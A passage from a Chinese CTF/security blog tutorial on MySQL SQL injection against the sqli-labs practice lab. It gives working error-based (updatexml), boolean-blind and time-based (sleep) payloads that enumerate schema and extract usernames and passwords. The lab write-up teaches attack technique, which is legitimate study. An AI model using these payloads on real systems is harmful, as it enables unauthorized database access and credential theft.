+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705221511811.png" alt="image-20200705221511811"></p>
+<p>可以看到在报错信息中泄露出了我们需要的表名，但是由于字数限制，查询结果显示不全，所以需要我们进一步处理：（两种方法）</p>
+<ol>
+<li>使用字符串切片函数<code>substr()</code>对查询结果进行分割</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,(select substr(group_concat(0x23,table_name,0x23),20,30) from information_schema.tables where table_schema=&#x27;security&#x27;),1) -- +</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705222306824.png" alt="image-20200705222306824"></p>
+<ol start="2">
+<li>使用<code>limit</code>函数对依次对结果进行遍历输出</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,(select concat(0x23,table_name,0x23) from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),1) -- +</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705222241780.png" alt="image-20200705222241780"></p>
+<p>不管哪一种方法，都可以查到我们需要的表<code>users</code></p>
+<h3 id="5-求字段名（列名）">5.求字段名（列名）</h3>
+<p>与查表名相类似，注入语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,(select substr(group_concat(0x23,column_name,0x23),1,50) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; ),1) -- +</span><br></pre></td></tr></table></figure>
+<p>查询结果</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705222538905.png" alt="image-20200705222538905"></p>
+<h3 id="6-查数据">6.查数据</h3>
+<p>注入语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,(select substr(group_concat(0x23,username,0x24,password,0x23),110,50) from security.users ),1) -- +</span><br></pre></td></tr></table></figure>
+<p>查询结果：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200705224505884.png" alt="image-20200705224505884"></p>
+<p>同样也拿到了admin账户的密码</p>
+<h2 id="布尔型盲注">布尔型盲注</h2>
+<p>如果在我们注入的时候网页中对数据库的查询信息没有任何回显（包括报错信息），那么我们就不能使用上面介绍的两种注入方式，这时候就需要我们尝试进行盲注。当我们的数据库执行语句正确的时候页面会显示一些正常信息，当我们注入的语句使数据库报错的时候，页面则不会显示信息，或者只提示语法错误，通过这个特点，我们可以对我们需要的内容进行逐字符猜测验证，从而拿到我们想要的数据</p>
+<blockquote>
+<p>这里使用Less-8进行试验</p>
+</blockquote>
+<h3 id="1-测注入点和闭合字符">1.测注入点和闭合字符</h3>
+<p>与联合注入的操作方式一样，只是通过判断页面是否输出来检验闭合字符的正确性</p>
+<p>通过测试，判断出来这里的注入字符为<code>'</code></p>
+<h3 id="2-求库名">2.求库名</h3>
+<p>求数据库名还是使用database()数据库，先查一下数据库名的长度</p>
+<p>可以使用二分法依次尝试数据库名的长度</p>
+<p>先判断长度是否小于10，如果条件成立则页面会有输出</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and length(database())&lt;10 -- +</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200706142550048.png" alt="image-20200706142550048"></p>
+<p>如果不成立，比如我们测试长度小于5</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and length(database())&lt;5 -- +</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200706144745477.png" alt="image-20200706144745477"></p>
+<p>那么页面不会有任何输出，说明我们构造的长度小于5使得数据库产生了语法错误，所以长度小于5是不成立的</p>
+<p>然后再尝试小于8，发现依然没有输出，那么证明它的长度是不大于8并且小于10的，再尝试长度小于9，页面产生了输出，那么就可以判断数据库名的长度为8</p>
+<p>再输入等于8进行检验</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and length(database())=8 -- +</span><br></pre></td></tr></table></figure>
+<p>可以看到页面有正常输出，那么就可以确定库名的长度为8了</p>
+<p>知道长度之后就可以逐字符猜测数据库名称了</p>
+<p>对于数据库名的猜测使用ascii()函数，这个函数会输出传入参数的第一个字符的ASCII码，然后使用substr()函数对查到的数据库名进行逐字符分割</p>
+<p>然后使用二分法逐字符判断出具体的数据库名</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and ascii(substr(database(),1,1))&lt;115 -- +        [False]</span><br><span class="line">id=1&#x27; and ascii(substr(database(),1,1))&lt;116 -- +        [True]</span><br></pre></td></tr></table></figure>
+<p>由此可以判断出数据库名的第一个字符的ASCII码为115，即字符<code>s</code></p>
+<p>以此类推，就可以判断出整个数据库名为<code>security</code></p>
+<h3 id="3-求表名">3.求表名</h3>
+<p>要求得表名就要先知道数据库中有多少个表，这里使用count()函数进行判断</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)=4 -- +</span><br></pre></td></tr></table></figure>
+<p>通过猜测select count()查询出来的值来判断数据库中表的个数，可以看到有4个表</p>
+<p>对于具体的表名，就需要使用上面求数据库名的方法逐字符进行爆破猜测</p>
+<p>首先使用concat()函数和limit语句限制查询结果的输出个数，然后对输出的每个表名使用substr()函数进行逐字符的拆分爆破</p>
+<p>下面展示一个查询正确的注入语句</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and ascii((select substr(concat(table_name),1,1) from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1))=117 -- +</span><br></pre></td></tr></table></figure>
+<p>可以判断第四个表的第一个字符为<code>u</code></p>
+<p>经过漫长的猜测查询过程后，我们得到了四个表的表名：<code>emails</code>、<code>referers</code>、<code>uagents</code>、<code>users</code>，其中users即为我们想要注入拿到数据的表</p>
+<h3 id="4-求列名">4.求列名</h3>
+<p>与求表名的步骤基本相同，只是这里需要查询<code>information_schema.columns</code>表</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and ascii((select substr(concat(column_name),1,1) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 2,1))=112 -- +</span><br></pre></td></tr></table></figure>
+<p>通过不断爆破注入可以拿到<code>users</code>表中存在的字段有：<code>id</code>、<code>username</code>、<code>password</code></p>
+<h3 id="5-查数据">5.查数据</h3>
+<p>我们可以挨个查询username和password的值</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and ascii((select substr(concat(username),1,1) from security.users limit 7,1))=97 -- +</span><br><span class="line">id=1&#x27; and ascii((select substr(concat(password),1,1) from security.users limit 7,1))=97 -- +</span><br></pre></td></tr></table></figure>
+<p>通过不断尝试可以拿到admin的用户名和密码：admin/admin</p>
+<h2 id="时间型盲注">时间型盲注</h2>
+<p>如果网页对于数据库的查询不会有任何的返回结果或者报错输出，就没法使用布尔型盲注。页面无法提供有用的回显信息，就无法进行判断注入的正确与否，对于这种情况，我们一般采用基于web应用响应时间上的差异来判断是否存在SQL注入，即基于时间的SQL盲注。</p>
+<p>时间型盲注会用到两个新的函数：<code>if()</code>和<code>sleep()</code></p>
+<p>对于<code>if()</code>函数，一般我们使用的语法为：<code>if(查询语句,1,sleep(5))</code>，即如果我们查询的结果为真，那么网页正常加载返回结果；如果我们查询的语句为假，那么网页会加载5s之后才返回显示页面内容。我们可以根据页面返回时间的长短来判断我们的查询语句判断是否正确。进行到这里，我们的判断方法与之前的布尔型盲注就相同了，也就是构造查询语句来判断结果是否为真。</p>
+<p>这里拿爆破出数据库长度作为例子进行讲解</p>
+<p>首先我们使用的注入语句为：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and if(length(database())&lt;10,1,sleep(5)) -- +</span><br></pre></td></tr></table></figure>
+<p>这里是判断数据库名的长度是否小于10，如果成立的话，页面直接就会加载出来，如果不成立，需要等待5s的时间页面才会加载完毕</p>
+<p>这里提交URL之后，页面会立即加载出来，然后我们再进行下一步猜测</p>
+<p>根据二分法的原则，这次注入的语句判断长度是否小于5：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and if(length(database())&lt;5,1,sleep(5)) -- +</span><br></pre></td></tr></table></figure>
+<p>这次提交URL之后明显能感觉到网页的加载时间变长了许多，浏览器标签页的加载图标会徘徊那么一段时间</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/loading.gif" alt="页面加载"></p>
+<p>同样地，我们再将长度的猜测改为小于8，发现加载时间还是比较长，然后改为&lt;9，加载时间就比较快了，由此可以推断出当前网页使用的数据库名的长度为8</p>
+<p>对于其他需要查询的信息，就基本与布尔型盲注的查询方式相同，只需要将判断信息的查询语句放在<code>if()</code>函数的第一个参数中，然后根据页面加载的时间进行判断即可</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://baymrx.me">BayMRX.</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://baymrx.me/posts/e73517db">https://baymrx.me/posts/e73517db</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://baymrx.me" target="_blank">BayMRX</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200705230504.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src= "/img/loading.gif" data-lazy-src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src= "/img/loading.gif" data-lazy-src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/2f65c0c4" title="SQL注入之sqlmap的使用方法"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200707204638.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SQL注入之sqlmap的使用方法</div></div></a></div><div class="next-post pull-right"><a href="/posts/50cf5e7c" title="SSRF漏洞原理简介及绕过技巧"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200704203332.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SSRF漏洞原理简介及绕过技巧</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/2f65c0c4" title="SQL注入之sqlmap的使用方法"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200707204638.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-07</div><div class="title">SQL注入之sqlmap的使用方法</div></div></a></div><div><a href="/posts/38f474e5" title="AWVS漏洞扫描的使用过程"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200630191737.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-06-30</div><div class="title">AWVS漏洞扫描的使用过程</div></div></a></div><div><a href="/posts/6e251019" title="BurpSuite的4种常用功能使用"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/burpsuite-twittercard.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-06-29</div><div class="title">BurpSuite的4种常用功能使用</div></div></a></div><div><a href="/posts/7761df94" title="DVWA练习——CSRF漏洞原理"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200704200209.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-04</div><div class="title">DVWA练习——CSRF漏洞原理</div></div></a></div><div><a href="/posts/d3bdf29c" title="DVWA练习——XSS漏洞原理"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200702175005.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-02</div><div class="title">DVWA练习——XSS漏洞原理</div></div></a></div><div><a href="/posts/664e0a31" title="Nmap的几种常见扫描方式"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200630151354.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-06-30</div><div class="title">Nmap的几种常见扫描方式</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">BayMRX.</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/BayMRX"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/BayMRX" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:mujian2009@126.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B"><span class="toc-text">SQL注入简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-text">万能密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%80%BB%E8%BE%91%E6%88%96%E6%B3%A8%E5%85%A5"><span class="toc-text">1.逻辑或注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%B3%A8%E5%85%A5"><span class="toc-text">2.注释符注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-text">联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B5%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">1.测注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B1%82%E9%97%AD%E5%90%88%E5%AD%97%E7%AC%A6"><span class="toc-text">2.求闭合字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%B1%82%E5%88%97%E6%95%B0"><span class="toc-text">3.求列数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%B1%82%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="toc-text">4.求显示位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%B1%82%E5%BA%93%E5%90%8D"><span class="toc-text">5.求库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%B1%82%E8%A1%A8%E5%90%8D"><span class="toc-text">6.求表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%B1%82%E5%88%97%E5%90%8D%EF%BC%88%E5%AD%97%E6%AE%B5%E5%90%8D%EF%BC%89"><span class="toc-text">7.求列名（字段名）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%B1%82%E5%88%97%E5%90%8D"><span class="toc-text">7.求列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E6%9F%A5%E6%95%B0%E6%8D%AE"><span class="toc-text">8.查数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B5%8B%E6%B3%A8%E5%85%A5%E7%82%B9-2"><span class="toc-text">1.测注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B1%82%E9%97%AD%E5%90%88%E5%AD%97%E7%AC%A6-2"><span class="toc-text">2.求闭合字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%B1%82%E5%BA%93%E5%90%8D"><span class="toc-text">3.求库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%B1%82%E8%A1%A8%E5%90%8D"><span class="toc-text">4.求表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%B1%82%E5%AD%97%E6%AE%B5%E5%90%8D%EF%BC%88%E5%88%97%E5%90%8D%EF%BC%89"><span class="toc-text">5.求字段名（列名）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%9F%A5%E6%95%B0%E6%8D%AE"><span class="toc-text">6.查数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔型盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B5%8B%E6%B3%A8%E5%85%A5%E7%82%B9%E5%92%8C%E9%97%AD%E5%90%88%E5%AD%97%E7%AC%A6"><span class="toc-text">1.测注入点和闭合字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B1%82%E5%BA%93%E5%90%8D"><span class="toc-text">2.求库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%B1%82%E8%A1%A8%E5%90%8D"><span class="toc-text">3.求表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%B1%82%E5%88%97%E5%90%8D"><span class="toc-text">4.求列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9F%A5%E6%95%B0%E6%8D%AE"><span class="toc-text">5.查数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="toc-text">时间型盲注</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/946c99e6" title="2024 GitHub Student Developer Pack 学生开发包申请指南"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20240106182849.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024 GitHub Student Developer Pack 学生开发包申请指南"/></a><div class="content"><a class="title" href="/posts/946c99e6" title="2024 GitHub Student Developer Pack 学生开发包申请指南">2024 GitHub Student Developer Pack 学生开发包申请指南</a><time datetime="2024-01-06T10:27:15.000Z" title="发表于 2024-01-06 18:27:15">2024-01-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/7bcf35fc" title="Oh-My-Zsh 安装&amp;配置"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20230704144049.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Oh-My-Zsh 安装&amp;配置"/></a><div class="content"><a class="title" href="/posts/7bcf35fc" title="Oh-My-Zsh 安装&amp;配置">Oh-My-Zsh 安装&amp;配置</a><time datetime="2023-07-04T06:24:06.000Z" title="发表于 2023-07-04 14:24:06">2023-07-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/5233648" title="Go SDK搭建多通道多orderer节点的Fabric环境"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/202208081326239.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Go SDK搭建多通道多orderer节点的Fabric环境"/></a><div class="content"><a class="title" href="/posts/5233648" title="Go SDK搭建多通道多orderer节点的Fabric环境">Go SDK搭建多通道多orderer节点的Fabric环境</a><time datetime="2022-08-11T12:04:43.000Z" title="发表于 2022-08-11 20:04:43">2022-08-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By BayMRX.</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twkioo-vercel.vercel.app/',
+      region: '',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twkioo-vercel.vercel.app/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.textContent = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
